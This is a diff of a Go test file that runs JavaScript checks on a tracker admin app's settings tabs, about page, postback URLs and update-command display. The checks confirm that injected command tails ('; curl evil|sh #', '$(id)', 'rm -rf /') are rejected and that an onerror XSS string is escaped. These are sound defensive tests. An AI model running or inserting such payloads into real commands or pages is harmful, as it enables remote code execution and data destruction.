@@ -172,6 +172,7 @@ eq(countryCode('es'), 'es', 'code stays the code');
 eq(countryLabel('es', 'ru'), 'Испания', 'chip name ru');
 eq(countryLabel('es', 'uk'), 'Іспанія', 'chip name uk');
 eq(countryLabel('es', 'en') === 'es', false, 'name is not the code twice');
+eq(countryLabel('unknown', 'ru'), 'Unknown', 'a country without a code is named Unknown');
 const now = new Date('2026-10-13T15:00:00Z');
 const ymd = (d) => d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0');
 eq(ymd(periodSpan('today', now).from), '2026-10-13', 'today');
@@ -300,8 +301,10 @@ eq(grantBody('created', ['a'], ['l'], true), {mode:'created'}, 'role grant has n
 eq(grantBody('created', ['a'], ['l'], false), {mode:'created', ids:['a'], labels:['l']}, 'user created grant keeps its lists');
 eq(grantBody('selected', ['a'], [], false), {mode:'selected', ids:['a'], labels:[]}, 'selected grant keeps its lists');
 eq(grantBody('read', ['a'], ['l'], false), {mode:'read'}, 'read grant has no lists');
-eq(hideChoices(null, null), ['profit','cost'], 'no field list gives the money groups');
-eq(hideChoices([{name:'ts',hideable:false},{name:'ip',hideable:true},{name:'cost_cents',hideable:true},{name:'profit',hideable:true},{name:'country'}], ['ip','legacy']), ['profit','cost','ip','legacy'], 'only hideable fields, the cost members are the cost group, leftovers stay');
+eq(hideChoices(null, null), ['cost','profit'], 'no field list gives the money groups');
+eq(hideChoices([{name:'ts',hideable:false},{name:'ip',hideable:true},{name:'cost_cents',hideable:true},{name:'profit',hideable:true},{name:'country'}], ['ip','legacy']), ['cost','profit','ip','legacy'], 'only hideable fields, the cost members are the cost group, leftovers stay');
+eq(hideChoices([{name:'ip',hideable:true},{name:'sub_id_2',hideable:true},{name:'country',hideable:true},{name:'depsum',hideable:true},{name:'campaign',hideable:true},{name:'sub_id_1',hideable:true},{name:'cid',hideable:true},{name:'org',hideable:true}], []), ['campaign','cost','profit','depsum','country','cid','sub_id_1','sub_id_2','ip','org'], 'chips follow the display order of the groups');
+eq(byFieldOrder([{name:'zzz'},{name:'ip'},{name:'campaign'},{name:'aaa'}], f=>f.name).map(f=>f.name), ['campaign','ip','zzz','aaa'], 'unlisted fields keep their order after the listed ones');
 eq(userRoleField('USER','r1','',true), {role_id:'r1'}, 'create with a role sends it');
 eq(userRoleField('USER','','',true), {}, 'create with own access sends no role_id');
 eq(userRoleField('USER','r1','r1',false), {}, 'an unchanged role is not sent');
@@ -707,20 +710,20 @@ eq(cronCardOrder(cronIds, ['geo_db','geo_db','telegram']), ['geo_db','telegram',
   eq(applyPageViews(put, def).dashRecent, [{ id: 'ip', on: true }, { id: 'ts', on: true }], 'recent columns survive a round trip');
   eq(applyPageViews({ dashboard: { kpis: 'visits', blocks: [] } }, def).dashKpis, undefined, 'a bad set is ignored');
 }
-eq(postbackBase('admin.emasotds.online','https:','https://admin.emasotds.online','http://admin.emasotds.online:8080'), 'https://admin.emasotds.online', 'postback base drops the engine port');
+eq(postbackBase('admin.example.com','https:','https://admin.example.com','http://admin.example.com:8080'), 'https://admin.example.com', 'postback base drops the engine port');
 eq(postbackBase('127.0.0.1','http:','http://127.0.0.1:8090','http://127.0.0.1:8080'), 'http://127.0.0.1:8080', 'postback base on localhost stays the engine');
 ['localhost','http://localhost:8080','app.localhost','127.0.0.1','127.8.9.10','https://127.0.0.1:8090/x','[::1]','http://[::1]:8080','::1','10.0.0.5','172.16.0.1','172.31.255.255','192.168.1.10','169.254.1.1','0.0.0.0','nas','box.local','svc.internal','host.lan','http://user@192.168.0.2:8080/path','100.64.0.1','fd00::1','fe80::1']
   .forEach(h => eq(isLocalHost(h), true, 'local address: ' + h));
-['212.2.33.246','https://212.2.33.246','http://212.2.33.246:8080/p','8.8.8.8','172.15.0.1','172.32.0.1','192.169.1.1','11.0.0.1','100.63.0.1','admin.emasotds.online','https://admin.emasotds.online','localhost.example.com','2606:4700::1111','','   ',null,undefined]
+['203.0.113.10','https://203.0.113.10','http://203.0.113.10:8080/p','8.8.8.8','172.15.0.1','172.32.0.1','192.169.1.1','11.0.0.1','100.63.0.1','admin.example.com','https://admin.example.com','localhost.example.com','2606:4700::1111','','   ',null,undefined]
   .forEach(h => eq(isLocalHost(h), false, 'public address or nothing: ' + h));
-eq(postbackURL('https://admin.emasotds.online/'), 'https://admin.emasotds.online/postback?subid=REPLACE&status=REPLACE&payout=REPLACE', 'postback URL carries the three REPLACE placeholders');
+eq(postbackURL('https://admin.example.com/'), 'https://admin.example.com/postback?subid=REPLACE&status=REPLACE&payout=REPLACE', 'postback URL carries the three REPLACE placeholders');
 eq(postbackHosts('https://a.example/', [{host:'b.example'},{host:'https://a.example/'},{host:'c.example',disabled:true},{host:''},null]), ['https://a.example','https://b.example'], 'postback hosts: main first, link domains unique, disabled and empty skipped');
 eq(postbackHosts('', []), [], 'postback hosts: nothing known');
 eq(postbackDefaultHost([{host:'links.example',role:'links'},{host:'Panel.Example.',role:'admin'},{host:'two.example',role:'both'}], '127.0.0.1', ['http://127.0.0.1:8080']), 'https://admin.panel.example', 'postback default: first admin-panel domain as admin.<host>');
 eq(postbackDefaultHost([{host:'off.example',role:'admin',disabled:true},{host:'admin.x.example',role:'admin'},{host:'p.example',role:'links',primary:true}], '', []), 'https://admin.p.example', 'postback default: disabled and admin.* skipped, primary counts');
 eq(postbackDefaultHost([{host:'l.example',role:'links'}], 'trk.example', ['https://trk.example','https://l.example']), 'https://trk.example', 'postback default: public page name');
-eq(postbackDefaultHost([{host:'l.example',role:'links'}], '212.2.33.246', ['https://212.2.33.246','https://l.example']), 'https://l.example', 'postback default: bare IP page falls to the first link domain');
-eq(postbackDefaultHost([], '212.2.33.246', ['https://212.2.33.246']), 'https://212.2.33.246', 'postback default: bare IP without link domains keeps the current host');
+eq(postbackDefaultHost([{host:'l.example',role:'links'}], '203.0.113.10', ['https://203.0.113.10','https://l.example']), 'https://l.example', 'postback default: bare IP page falls to the first link domain');
+eq(postbackDefaultHost([], '203.0.113.10', ['https://203.0.113.10']), 'https://203.0.113.10', 'postback default: bare IP without link domains keeps the current host');
 eq(postbackDefaultHost([], 'localhost', ['http://127.0.0.1:8080','https://l.example']), 'http://127.0.0.1:8080', 'postback default: localhost keeps the engine address');
 eq(postbackDefaultHost(null, '', null), '', 'postback default: nothing known');
 eq(postbackStatusURL('https://a.example/', 'rejected'), 'https://a.example/postback?subid={subid}&status=rejected', 'postback rejected: canonical status, no payout');
@@ -1894,5 +1897,339 @@ if (failed) process.exit(1);
 	}
 	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
 		t.Errorf("keyword statistics checks failed:\n%s", out)
+	}
+}
+
+// spaTopFunction returns the source of one top-level SPA function: from its declaration to the closing brace at the start of a line,
+// or just the declaration line for a one-line function.
+// html is the SPA source, name the function name, async selects "async function" over "function".
+// It returns "" when the declaration is not found.
+func spaTopFunction(html, name string, async bool) string {
+	open := "function " + name + "("
+	if async {
+		open = "async " + open
+	}
+	i := strings.Index(html, open)
+	if i < 0 {
+		return ""
+	}
+	rest := html[i:]
+	if nl := strings.Index(rest, "\n"); nl >= 0 && strings.HasSuffix(rest[:nl], "}") && !strings.HasSuffix(rest[:nl], "{") && strings.Contains(rest[:nl], "){") {
+		return rest[:nl]
+	}
+	if end := strings.Index(rest, "\n}\n"); end >= 0 {
+		return rest[:end+2]
+	}
+	return rest
+}
+
+// spaConstLine returns the SPA line that starts with prefix, or "" when there is none.
+// html is the SPA source and prefix the start of the line, for example "const esc=".
+func spaConstLine(html, prefix string) string {
+	i := strings.Index(html, "\n"+prefix)
+	if i < 0 {
+		return ""
+	}
+	rest := html[i+1:]
+	if nl := strings.Index(rest, "\n"); nl >= 0 {
+		return rest[:nl]
+	}
+	return rest
+}
+
+// settingsAboutChecks are the assertions of TestSettingsTabsAndAbout: the user menu entries equal the settings tabs for
+// every kind of account, the old updates address leads to the about tab, the about page draws no alarm without a signature
+// policy, prints "what's new" only through esc, and draws only the server fields that arrived.
+const settingsAboutChecks = `
+let failed = 0;
+const eq = (got, want, what) => {
+  const g = JSON.stringify(got), w = JSON.stringify(want);
+  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
+};
+const yes = (cond, what) => { if (!cond) { failed++; console.log('FAIL ' + what); } };
+
+const TAB_KEYS = ['menu.settings', 'prof.users', 'prof.keys', 'board.settings', 'about.tab'];
+const menuLabels = () => userMenuItems('u').filter(i => i.label).map(i => i.label);
+const tabButtons = (html) => [...html.matchAll(/data-ptab="([a-z]+)"[^>]*>([^<]*)</g)].map(m => [m[1], m[2]]);
+
+// The menu lists the tab entries in the tab order, with the tab captions, for each kind of account.
+const accounts = {
+  admin: {type:'ADMIN', admin:true},
+  keysAndUsers: {type:'USER', access:{}, pages:['settings', 'api_keys', 'users']},
+  usersOnly: {type:'USER', access:{}, pages:['settings', 'users']},
+  plain: {type:'USER', access:{}, pages:['settings']},
+};
+const want = {
+  admin: TAB_KEYS,
+  keysAndUsers: ['menu.settings', 'prof.users', 'prof.keys'],
+  usersOnly: ['menu.settings', 'prof.users'],
+  plain: ['menu.settings'],
+};
+const opened = [];
+let replaced = '', wentTo = [], settingsDrawn = 0;
+const VIEW = {innerHTML: ''};
+view = () => VIEW;
+history = {replaceState: (a, b, url) => { replaced = url; }};
+go = (p) => { wentTo.push(p); };
+settings = () => { settingsDrawn++; };
+boardsPage = async () => { opened.push('boards'); };
+usersPage = async () => { opened.push('users'); };
+apiKeys = async () => { opened.push('keys'); };
+const realAbout = aboutPage;
+aboutPage = async () => { opened.push('about'); };
+(async () => {
+  for (const name of Object.keys(accounts)) {
+    ME = accounts[name];
+    const menuTabs = menuLabels().filter(l => TAB_KEYS.includes(l));
+    eq(menuTabs, want[name], 'menu entries of ' + name + ' follow the tab list');
+    await profile('');
+    const tabs = tabButtons(VIEW.innerHTML);
+    eq(tabs.map(t => t[1]), want[name], 'tab captions of ' + name + ' equal the menu captions');
+    eq(menuTabs, tabs.map(t => t[1]), 'menu and tabs are one list for ' + name);
+    yes(VIEW.innerHTML.includes('<h1>menu.settings</h1>'), 'the heading is the settings caption for ' + name);
+  }
+  const icons = userMenuItems('u').filter(i => i.label && TAB_KEYS.includes(i.label)).map(i => i.icon);
+  eq(icons, settingsTabsAllowed().map(t => t.icon), 'menu icons come from the tabs');
+  eq(settingsTabs().map(t => [t.id, t.key, t.route]), [
+    ['profile', 'menu.settings', 'settings'], ['users', 'prof.users', 'settings/users'], ['keys', 'prof.keys', 'settings/keys'],
+    ['boards', 'board.settings', 'settings/boards'], ['about', 'about.tab', 'settings/about']], 'the tab list');
+
+  // The administrator block of the menu: the order of the list, a separator before the postbacks and before the about entry.
+  const adminBlock = (me) => { ME = me; return adminMenuEntries().map(i => i === '-' ? '-' : i.label); };
+  eq(adminBlock(accounts.admin), ['menu.settings', 'prof.users', 'menu.integrations', 'prof.keys', 'board.settings', '-', 'pb.title', '-', 'about.tab'], 'the administrator menu order');
+  eq(adminBlock(accounts.plain), ['menu.settings'], 'a plain account has one entry and no separators');
+  eq(adminBlock({type: 'USER', access: {}, pages: ['settings', 'conversions']}), ['menu.settings', '-', 'pb.title'], 'a lone postbacks entry keeps one separator and drops the trailing one');
+  ME = accounts.admin;
+  const postbackEntry = adminMenuEntries().find(i => i.label === 'pb.title');
+  yes(postbackEntry && postbackEntry.on === SETTINGS_TABS.find(t => t.id === 'postbacks').open, 'the postbacks entry calls openPostbacks');
+  wentTo = []; adminMenuEntries().find(i => i.label === 'menu.integrations').on();
+  eq(wentTo, ['integrations'], 'the integrations entry opens the integrations page');
+
+  // The "About" entry carries the one mark of the header: red alert for a failed service, yellow download for a newer commit.
+  const aboutEntry = () => { const i = adminMenuEntries().find(e => e.label === 'about.tab'); return [i.icon, i.iconCls || '']; };
+  SIG.data = {update:false, down:[]};
+  eq(aboutEntry(), ['info', ''], 'no mark: the about entry keeps its icon');
+  SIG.data = {update:true, down:[]};
+  eq([aboutEntry(), sigMark()], [['download', 'sig-warn'], 'update'], 'a newer commit: yellow download on the about entry');
+  SIG.data = {update:true, down:['clickhouse', 'redis']};
+  eq([aboutEntry(), sigMark(), sigNames(SIG.data.down)], [['alert', 'sig-bad'], 'down', 'sig.svc.clickhouse, sig.svc.redis'], 'a failure wins over the update');
+  SIG.data = {update:false, down:[]};
+
+  // The environment of each build: Production only for env production, Development locally, nothing for an old process.
+  yes(buildLabelHTML({version:'v1', env:'production'}).includes('<span class="pill ok">about.env.production</span>'), 'production is marked');
+  yes(buildLabelHTML({version:'v1', env:'development'}).includes('<span class="pill">about.env.development</span>'), 'development is not production');
+  yes(!buildLabelHTML({version:'v1'}).includes('about.env'), 'no env, no mark');
+  ME = accounts.admin; opened.length = 0; settingsDrawn = 0; await profile('integrations');
+  eq([opened, settingsDrawn], [[], 1], 'a menu-only entry is not a tab address');
+
+  // The version line of the menu opens the about tab.
+  ME = accounts.admin;
+  UPD_VER = {admin: {version: 'v1', commit: 'abcdef0123456789'}};
+  const verItem = userMenuItems('u').find(i => i.cap && i.cap.includes('upd.version'));
+  yes(!!verItem, 'the version line is in the admin menu');
+  wentTo = []; verItem.on();
+  eq(wentTo, ['settings/about'], 'the version line leads to the about tab');
+  UPD_VER = null;
+
+  // Tab routing: the old updates address is the about tab, a tab without the right leads back, an unknown one is the settings tab.
+  ME = accounts.admin; opened.length = 0; wentTo = []; replaced = '';
+  await profile('updates');
+  eq([opened, replaced, wentTo], [['about'], '#/settings/about', []], 'updates is the about tab and the address is rewritten');
+  yes(VIEW.innerHTML.includes('data-ptab="about" aria-selected="true"'), 'the about tab is the selected one');
+  opened.length = 0; await profile('users'); await profile('keys'); await profile('boards');
+  eq(opened, ['users', 'keys', 'boards'], 'tabs open their pages');
+  opened.length = 0; settingsDrawn = 0; await profile('bogus');
+  eq([opened, settingsDrawn], [[], 1], 'an unknown tab draws the settings tab');
+  ME = accounts.plain; opened.length = 0; wentTo = [];
+  await profile('about'); await profile('users'); await profile('keys'); await profile('boards'); await profile('updates');
+  eq([opened, wentTo], [[], ['settings', 'settings', 'settings', 'settings', 'settings']], 'a user without the right is led back to settings');
+
+  // The section switcher adds nothing without a second section and no settings entry in any case.
+  ME = accounts.admin; BOARDS = {loaded: false};
+  const noBoards = []; appendBoardUserMenuItems(noBoards);
+  eq(noBoards, [], 'no switcher rows with only the default section');
+
+  // The setup form: the token field only when required, and the 403 answer has its own text.
+  eq(setupTokenFieldHTML(false), '', 'no token field when no token is required');
+  const field = setupTokenFieldHTML(true);
+  yes(field.includes('id="su-t"') && field.includes('setup.token.hint'), 'the token field has an id and a hint');
+  eq(setupMessage({status: 403, message: 'setup token is required'}), 'setup.token.bad', 'a missing token is explained');
+  eq(setupMessage({status: 403, message: 'setup token is wrong'}), 'setup.token.bad', 'a wrong token is explained');
+  eq(setupMessage({status: 400, message: 'bad'}), 'setup.bad', 'other answers keep their text');
+
+  // Helpers of the about page.
+  const sha = 'a'.repeat(40);
+  eq(changelogURL('https://github.com/owner/repo.git', sha), 'https://github.com/owner/repo/blob/' + sha + '/CHANGELOG.md', 'the .git suffix is dropped');
+  eq(changelogURL('https://github.com/owner/repo', sha), 'https://github.com/owner/repo/blob/' + sha + '/CHANGELOG.md', 'a plain address works');
+  for (const bad of ['http://github.com/o/r.git', 'https://example.com/o/r.git', 'https://u:p@github.com/o/r.git', 'https://github.com/o/..', 'https://github.com/o/r/x', 'git@github.com:o/r.git', '']) eq(changelogURL(bad, sha), '', 'no link for ' + bad);
+  eq([changelogURL('https://github.com/o/r', 'abc'), changelogURL('https://github.com/o/r', sha.toUpperCase())], ['', ''], 'only a full lower-case sha makes a link');
+  eq([0, 45, 3600, 90061, 86700].map(durationText), ['0 s', '45 s', '1 h', '1 d 1 h', '1 d'], 'durations show the two largest units');
+  eq(updSignBadge(false, '', false), '', 'no badge for an unsigned target without a policy');
+  yes(updSignBadge(false, '', true).includes('upd.unsigned'), 'a required signature is flagged');
+  yes(updSignBadge(true, 'Bob', false).includes('upd.signed: Bob'), 'a signed target names the signer');
+  const U = 'sudo /usr/local/lib/emtds/update.sh';
+  eq(schemaOkCommand([U + ' --check', U + ' --to abcdef0', U + ' --rollback']), U + ' --to abcdef0 --schema-ok', 'the exact command with --schema-ok');
+  eq(schemaOkCommand([U + ' --to v1.2.3 --unsigned']), U + ' --to v1.2.3 --unsigned --schema-ok', 'the flags stay in the line');
+  eq(schemaOkCommand([U + ' --check']), '', 'no --to command, no line');
+  const evil = ['abcdef0; curl evil|sh #', '$(id)', 'abcdef0 def', 'abc\nrm -rf /', '', 'ABCDEF1', 'abc --schema-ok --schema-ok', '../x', 'abcdef0 && id', 'abcdef0 --bogus'];
+  for (const tail of evil) {
+    eq(schemaOkCommand([U + ' --to ' + tail]), '', 'no --schema-ok line for the target "' + tail + '"');
+    eq(safeCLI([U + ' --to ' + tail]), [], 'the command with the target "' + tail + '" is dropped');
+  }
+  eq(safeCLI([U + ' --check; id', U + ' --channel --unsigned', 'sudo /tmp/update.sh --check', 'sudo  /usr/local/lib/emtds/update.sh --check', U + ' --to <sha>', 5, null, U + ' --rollback ']),
+    [U + ' --channel --unsigned', U + ' --to <sha>'], 'only the expected commands survive');
+  eq(safeCLI(null), [], 'no list, no commands');
+
+  // The server rows: only what arrived.
+  eq(systemRowsHTML(null, null), '', 'nothing arrived, no rows');
+  eq(systemRowsHTML({host: {}, services: {}}, {}), '', 'empty groups, no rows');
+  const onlyCPU = systemRowsHTML({host: {cpus: 4}}, null);
+  yes(onlyCPU.includes('about.cpus') && !/about\.(load|mem|disk|uptime)/.test(onlyCPU) && !onlyCPU.includes('—'), 'one field gives one row and no dash rows');
+  const full = systemRowsHTML({host: {cpus: 4, load: [0.12, 0.3, 0.25], mem_total: 8589934592, mem_available: 4294967296, uptime_s: 90061, disk_total: 107374182400, disk_free: 53687091200},
+    services: {clickhouse: {state: 'ok', ms: 3}, redis: {state: 'not_configured'}, cron: {heartbeat_age_s: 12, busy: true}}}, {engine: {version: 'v1'}});
+  yes(full.includes('0.12 / 0.30 / 0.25'), 'the load is three figures');
+  yes(full.includes('4\u00a0GB free of 8\u00a0GB'), 'the memory is free of total: ' + full);
+  yes(full.includes('50\u00a0GB free of 100\u00a0GB'), 'the disk is free of total');
+  yes(full.includes('1 d 1 h'), 'the uptime is human');
+  yes(full.includes('3 ms') && full.includes('Not configured') && full.includes('hb 12 s') && full.includes('about.busy'), 'the services show their state');
+  yes(full.includes('<span class="pill ok">OK</span>'), 'the engine from /api/version is up');
+  const noAvail = systemRowsHTML({host: {mem_total: 8589934592}}, null);
+  yes(noAvail.includes('8\u00a0GB') && !noAvail.includes('free of'), 'a total without a free figure shows the total only');
+  yes(systemRowsHTML(null, {engine_error: 'x'}).includes('pill bad'), 'an unreachable engine is flagged');
+  eq(systemRowsHTML({services: {cron: {}}}, null), '', 'an empty cron group draws no row');
+
+  // The about page.
+  aboutPage = realAbout;
+  const BODY = {innerHTML: ''}, SYSBOX = {innerHTML: ''}, REFBTN = {};
+  q = (sel) => sel === '#profile-body' ? BODY : sel === '#about-sys-body' ? SYSBOX : sel === '#about-sys-refresh' ? REFBTN : null;
+  qa = () => [];
+  let sysCalls = 0, answers = {};
+  get = async (path) => { if (path === '/api/system') sysCalls++; return path in answers ? answers[path] : null; };
+  const cur = 'b'.repeat(40);
+  const base = () => ({
+    build: {version: 'v0.1.0', commit: sha, commit_date: '2026-11-01T10:00:00Z', channel: 'main'},
+    agent: {repo: 'https://github.com/owner/repo.git', channel: 'main', signing: false, at: '2026-11-17T01:00:00Z'}, agent_fresh: true, inbox: true,
+    check: {at: '2026-11-17T01:00:00Z', ahead: 2, current: {commit: sha}, target: {commit: cur, version: 'v0.2.0'}, signed: false, signer: '',
+      commits: [{sha: cur, subject: 'subject <i>', author: 'a'}], notes: '<img src=x onerror=alert(1)>\n- line', manual_steps: ['run <b>x</b>']},
+    state: null, can_apply: true, can_rollback: false, cli: [U + ' --check', U + ' --to ' + cur.slice(0, 12), U + ' --rollback'],
+  });
+  const verOK = {admin: {version: 'v0.1.0', commit: sha, commit_date: '2026-11-01T10:00:00Z', channel: 'main'}, engine: {version: 'v0.1.0', commit: sha}, cron: {version: 'v0.1.0', commit: sha}, mismatch: false};
+  const sysOK = {host: {cpus: 4, mem_total: 8589934592, mem_available: 4294967296, uptime_s: 90061}, services: {redis: {state: 'ok', ms: 1}, clickhouse: {state: 'down'}}};
+
+  answers = {'/api/update': base(), '/api/version': verOK, '/api/system': sysOK};
+  await aboutPage();
+  let html = BODY.innerHTML;
+  yes(!html.includes('upd.unsigned'), 'no red badge without a signature policy');
+  yes(html.includes('<span class="pill">upd.sign.off</span>'), 'the neutral signature-off plate');
+  yes(html.includes('<pre class="notes">&lt;img src=x onerror=alert(1)&gt;'), 'what is new goes through esc');
+  yes(!html.includes('<img') && !html.includes('<i>') && !html.includes('<b>x</b>'), 'no raw markup from the check data');
+  yes(html.includes('&lt;b&gt;x&lt;/b&gt;'), 'a manual step goes through esc');
+  yes(html.includes('<code>' + U + ' --to ' + cur.slice(0, 12) + ' --schema-ok</code>'), 'the exact command with --schema-ok');
+  yes(html.includes('<code>' + U + ' --check</code>'), 'a valid command is printed');
+  yes(html.includes('href="https://github.com/owner/repo/blob/' + sha + '/CHANGELOG.md"') && html.includes('rel="noopener noreferrer"'), 'the changelog link');
+  yes(!html.includes('stale '), 'no stale warning when the check was made for this build');
+  yes(html.includes('A(2026-11-17T01:00:00Z)'), 'the age of the check');
+  yes(html.includes('W(2026-11-01T10:00:00Z)'), 'the build date');
+  eq(sysCalls, 1, 'the server block is read once on opening');
+  yes(SYSBOX.innerHTML.includes('about.cpus') && SYSBOX.innerHTML.includes('1 d 1 h') && SYSBOX.innerHTML.includes('1 ms'), 'the server rows that arrived');
+  yes(!/about\.(load|disk)/.test(SYSBOX.innerHTML) && !SYSBOX.innerHTML.includes('—'), 'the server rows that did not arrive are not drawn');
+  yes(SYSBOX.innerHTML.includes('<span class="pill bad">Down</span>'), 'a service that is down is flagged');
+  await REFBTN.onclick();
+  eq(sysCalls, 2, 'the server block reads again on its button');
+
+  const stale = base(); stale.check.current = {commit: cur};
+  answers = {'/api/update': stale, '/api/version': verOK, '/api/system': null};
+  await aboutPage();
+  yes(BODY.innerHTML.includes('stale ' + cur.slice(0, 12)), 'a check made for another build is flagged');
+  yes(SYSBOX.innerHTML.includes('about.server.err'), 'an unreadable server block says so');
+
+  const signing = base(); signing.agent.signing = true;
+  answers = {'/api/update': signing, '/api/version': verOK, '/api/system': sysOK};
+  await aboutPage();
+  yes(BODY.innerHTML.includes('<span class="pill bad">upd.unsigned</span>') && BODY.innerHTML.includes('<span class="pill ok">upd.sign.on</span>'), 'with the policy on, an unsigned target is flagged');
+  signing.check.signed = true; signing.check.signer = 'Bob';
+  await aboutPage();
+  yes(BODY.innerHTML.includes('upd.signed: Bob') && !BODY.innerHTML.includes('upd.unsigned'), 'a signed target shows the signer');
+
+  const same = base(); same.check.ahead = 0; same.check.manual_steps = []; same.check.notes = '';
+  answers = {'/api/update': same, '/api/version': verOK, '/api/system': sysOK};
+  await aboutPage();
+  yes(BODY.innerHTML.includes('upd.target.none') && BODY.innerHTML.includes('checked W(2026-11-17T01:00:00Z) (A(2026-11-17T01:00:00Z))'), 'up to date with the age of the check');
+
+  const hostile = base();
+  hostile.cli = [U + ' --check', U + ' --to ' + cur.slice(0, 12) + '; curl evil|sh #', U + ' --to $(id)', U + ' --to abc def', 'curl evil|sh', U + ' --rollback'];
+  answers = {'/api/update': hostile, '/api/version': verOK, '/api/system': sysOK};
+  await aboutPage();
+  yes(!/evil|\$\(|curl|abcdef0 def/.test(BODY.innerHTML), 'a command that is not of the expected shape is not drawn');
+  yes(BODY.innerHTML.includes('<code>' + U + ' --check</code>') && BODY.innerHTML.includes('<code>' + U + ' --rollback</code>'), 'the valid commands are still drawn');
+  yes(!BODY.innerHTML.includes('--schema-ok'), 'no --schema-ok line without a valid --to command');
+
+  const dev = base(); dev.build = {version: 'dev', commit: ''}; dev.agent.repo = 'ftp://x';
+  answers = {'/api/update': dev, '/api/version': {admin: dev.build}, '/api/system': sysOK};
+  await aboutPage();
+  yes(!BODY.innerHTML.includes('CHANGELOG.md') && !BODY.innerHTML.includes('about.stale'), 'a dev build has no changelog link and no stale warning');
+  if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
+})();
+`
+
+// TestSettingsTabsAndAbout runs the settings tabs, the user menu, the about page and the first-run token field under node.
+// The helpers and the pages are cut out of the SPA by name and run against small stubs of the page, the session and the API.
+// It skips when node is absent and fails with the node output when a check does not hold.
+func TestSettingsTabsAndAbout(t *testing.T) {
+	node, err := exec.LookPath("node")
+	if err != nil {
+		t.Skip("node not found — skipping the settings and about checks")
+	}
+	html := spaSource()
+	var b strings.Builder
+	b.WriteString("let ME=null, UPD_GEN=0, UPD_VER=null, BOARDS={loaded:false};\n")
+	b.WriteString("const PAGE_SECTION={};\n")
+	b.WriteString("const SIG={data:{update:false, down:[]}};\n")
+	b.WriteString("const dict={'about.free':'{free} free of {total}','about.ms':'{n} ms','about.hb':'hb {age}','about.state.ok':'OK','about.state.down':'Down','about.state.not_configured':'Not configured','about.stale':'stale {commit}','upd.target.checked':'checked {at}','land.unit.b':'B','land.unit.kb':'KB','land.unit.mb':'MB','land.unit.gb':'GB'};\n")
+	b.WriteString("const tr=k=>(k in dict)?dict[k]:k;\n")
+	b.WriteString("var uiLocale=()=>'en', when=s=>'W('+s+')', ago=s=>'A('+s+')', view, history, go, settings, boardsPage, usersPage, apiKeys, q, qa, get;\n")
+	b.WriteString("const userTypeLabel=()=>'Admin', openPostbacks=()=>{}, logout=()=>{}, boardSwitchRows=()=>[], postbackDocs=()=>{}, apiDocs=async()=>{};\n")
+	b.WriteString("var location={hash:''};\n")
+	b.WriteString("q=()=>null; qa=()=>[]; get=async()=>null;\n")
+	if line := spaConstLine(html, "const esc="); line != "" {
+		b.WriteString(line + "\n")
+	} else {
+		t.Fatal("esc not found in SPA")
+	}
+	if tabs := spaBetween(html, "const SETTINGS_TABS=[", "\n];"); tabs != "" {
+		b.WriteString(tabs + "\n];\n")
+	} else {
+		t.Fatal("SETTINGS_TABS not found in SPA")
+	}
+	for _, prefix := range []string{"const UPD_REPO_RE=", "const UPD_CLI_RE="} {
+		line := spaConstLine(html, prefix)
+		if line == "" {
+			t.Fatalf("%s not found in SPA", prefix)
+		}
+		b.WriteString(line + "\n")
+	}
+	for _, name := range []string{"trFill", "byteSize", "accessPages", "sectionAllowed", "pageAllowed", "meIsAdmin", "settingsTabs", "settingsTabsAllowed", "adminMenuEntries", "userMenuItems",
+		"appendBoardUserMenuItems", "boardChromeVisible", "changelogURL", "updSignBadge", "safeCLI", "schemaOkCommand", "durationText", "systemRowsHTML",
+		"buildLabelHTML", "setupTokenFieldHTML", "setupMessage", "sigMark", "sigNames", "sigMenuMark"} {
+		fn := spaTopFunction(html, name, false)
+		if fn == "" {
+			t.Fatalf("%s not found in SPA", name)
+		}
+		b.WriteString(fn + "\n")
+	}
+	for _, name := range []string{"profile", "aboutPage"} {
+		fn := spaTopFunction(html, name, true)
+		if fn == "" {
+			t.Fatalf("%s not found in SPA", name)
+		}
+		b.WriteString(fn + "\n")
+	}
+	b.WriteString(settingsAboutChecks)
+	f := filepath.Join(t.TempDir(), "settings-about.js")
+	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
+		t.Errorf("settings and about checks failed:\n%s", out)
 	}
 }
